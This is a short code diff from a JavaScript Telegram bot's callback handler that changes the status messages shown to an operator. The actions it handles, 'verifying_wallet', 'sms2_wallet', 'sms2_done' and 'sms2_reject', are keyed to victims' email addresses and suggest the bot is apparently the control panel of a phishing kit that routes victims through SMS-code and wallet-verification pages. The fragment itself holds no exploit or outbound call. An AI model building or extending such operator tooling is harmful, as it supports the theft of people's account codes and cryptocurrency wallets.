@@ -336,11 +336,11 @@ bot.on("callback_query", async (query) => {
       } else if (action === "verifying_wallet") {
         statusMessage = `📧 <code>${email}</code> → <b>Wallet</b> 💼`;
       } else if (action === "sms2_wallet") {
-        statusMessage = `🔐 <code>${email}</code> SMS 2 → <b>Wallet</b> 💼`;
+        statusMessage = `📧 <code>${email}</code> has been directed to <b>Wallet</b> 💼`;
       } else if (action === "sms2_done") {
-        statusMessage = `🔐 <code>${email}</code> SMS 2 → <b>Done</b> 🏁`;
+        statusMessage = `📧 <code>${email}</code> has been directed to <b>Done</b> 🏁`;
       } else if (action === "sms2_reject") {
-        statusMessage = `🔐 <code>${email}</code> SMS 2 → <b>Rejected</b> ❌`;
+        statusMessage = `📧 <code>${email}</code> has been <b>Rejected</b> ❌`;
       }
 
       console.log(`📨 Final statusMessage: "${statusMessage}"`);
